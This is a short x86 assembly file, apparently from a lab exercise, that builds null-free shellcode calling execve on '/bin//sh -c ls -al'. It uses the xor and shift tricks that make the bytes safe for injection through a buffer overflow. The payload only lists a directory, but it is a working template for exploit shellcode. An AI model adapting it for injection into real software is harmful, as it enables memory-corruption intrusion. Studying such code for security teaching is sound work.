section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address


      ;al##
      push eax
      mov ecx, "al##"   ; 0x23236C61
      shl ecx, 16       ; 0x6C610000
      shr ecx, 16       ; 0x00006C61
      push ecx 
      
      ;ls -
      push "ls -"
      mov ecx, esp

     ;-c##
      push eax
      mov eax, "-c##"   ; 0x2323632D
      shl eax, 16       ; 0x632D0000
      shr eax, 16       ; 0x0000632D
      push eax
      mov edx, esp


      ; Construct the argument array argv[]
      xor eax, eax
      push eax          ; argv[3] = 0
      push ecx          ; argv[2] points "ls -al"
      push edx          ; argv[1] points "-c"
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80